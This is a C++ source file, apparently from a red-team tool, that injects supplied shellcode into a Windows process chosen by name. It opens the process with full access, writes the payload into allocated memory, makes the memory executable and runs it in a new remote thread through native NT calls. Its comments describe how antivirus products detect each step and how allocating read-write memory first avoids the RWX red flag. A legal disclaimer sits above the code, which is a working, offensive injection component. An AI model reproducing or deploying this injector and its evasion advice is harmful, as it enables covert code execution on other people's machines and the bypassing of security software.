/*
 * Copyright (c) 2026 JackTheRibber0 - https://github.com/JackTheRibber0
 * Licensed under the Apache License, Version 2.0
 *
 * LEGAL DISCLAIMER:
 * This C++ source code and the resulting binary are intended strictly for
 * educational purposes, academic research, and authorized Red Team operations.
 * The author assumes no liability for unauthorized or malicious use.
 */

#include "Injector.h"

#include <vector>

using namespace injection;

#ifdef _EXE

DWORD Injector::findCapableTarget(const std::string& procName) const
{
	DWORD pid = 0;
	DWORD pCount = 0;
	WTS_PROCESS_INFOA* pProcInfo;
	if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pProcInfo, &pCount)) return 0;

	DWORD iter = 0;
	do
	{
		if (lstrcmpiA(procName.c_str(), pProcInfo[iter].pProcessName) == 0)
		{
			pid = pProcInfo[iter].ProcessId;

			Logger::getInstance().logf("Injector::findCapableTarget: Found capable target.\nName: {}.\nPID: {}.\n", procName, pid);

			break;
		}

		++iter;
	} while (iter < pCount);

	return pid;
}
#endif

BOOL Injector::inject(const PBYTE code, SIZE_T codeLen, const std::string& procName, const DWORD procId, const bool bUseAPC) const
{
	DWORD dwPid = NULL;

#ifdef _WINDLL
	dwPid = procId;
#else
	dwPid = findCapableTarget(procName);
#endif

	//	Opens process by PID using Windows NtOpenProcess - lower part of ZwOpenProcess that can be hooked by AV.		//
	//	Usually this procedure is not marked by AV as harmful or suspicios, especially if this is a kernel level call.	//
	ScopedHandle hProc;
	NTSTATUS status = NULL;
	CLIENT_ID clientId = { (HANDLE)dwPid , 0 };
	OBJECT_ATTRIBUTES objAttributes = { sizeof(objAttributes), 0 };
	status = NtOpenProcess(hProc.getAdress(), PROCESS_ALL_ACCESS, &objAttributes, &clientId);
	if (status != STATUS_SUCCESS)
	{
		if (hProc) hProc.reset();
		return FALSE;
	}
	Logger::getInstance().logf("Injector::inject: Opened process.\n");
	//******************************************************************************************************//


	//	Reserves and commits region memory page within specified process. 									//
	//	Usually this procedure can be marked by AV suspicios, however, if not used as a kernel level call.	//
	//	The biggest red-flag for AV is PAGE_READWRITEEXECUTE (RWX) mem region. Thats why memory allocated	//
	//	with the usage of PAGE_READWRITE flag, or in other words RW											//
	PVOID rBuff = NULL;
	SIZE_T allocSize = 4096;
	status = NtAllocateVirtualMemory(hProc.get(), &rBuff, 0, &allocSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (status != STATUS_SUCCESS)
	{
		if (hProc) hProc.reset();
		return FALSE;
	}
	Logger::getInstance().logf("Injector::inject: Allocated vmem.\nSize: {}.\n", allocSize);
	//******************************************************************************************************//


	//	Writes potential shellcode into allocated mamory part in process space.											//
	//	Usually this procedure is not marked by AV as harmful or suspicios, especially if this is a kernel level call.	//
	SIZE_T bytesWritten = 0;
	status = NtWriteVirtualMemory(hProc.get(), rBuff, code, codeLen, &bytesWritten);
	if (status != STATUS_SUCCESS)
	{
		if (hProc) hProc.reset();
		return FALSE;
	}
	//******************************************************************************************************************//



	//	Changes written memory region security flags to PAGE_EXECUTE_READ(RX) in order to allow execution of written shellcode	//
	//	Usually this procedure cannot be marked by AV as suspicios																//
	ULONG oldProtection;
	status = NtProtectVirtualMemory(hProc.get(), &rBuff, &allocSize, PAGE_EXECUTE_READ, &oldProtection);
	if (status != STATUS_SUCCESS)
	{
		if (hProc) hProc.reset();
		return FALSE;
	}
	//*************************************************************************************************************************//


	//	Creates side thread that starts execution of written shellcode inside of our process	//
	//	ALWAYS marked by AV as suspicios and harmful. Except basic windows defender				//
	ScopedHandle hThread;
	status = NtCreateThreadEx(hThread.getAdress(), THREAD_ALL_ACCESS, NULL, hProc, rBuff, NULL, FALSE, 0, 0, 0, NULL);
	if (status != STATUS_SUCCESS)
	{
		if (hProc) hProc.reset();
		return FALSE;
	}
	Logger::getInstance().logf("Injector::inject: Created new thread.\nAddress: {}.\n", hThread.getAdress());
	//*************************************************************************************************************************//


	//	Waits for end of our ex thread	//
	status = NtWaitForSingleObject(hThread.get(), FALSE, NULL);
	if (status != STATUS_SUCCESS)
	{
		if (hProc) hProc.reset();
		return FALSE;
	}
	Logger::getInstance().logf("Injector::inject: Operation successfully completed.\n");
	//********************************//

#ifdef _WINDLL
	if (status == 0) status = 1;
#endif

	return status;
}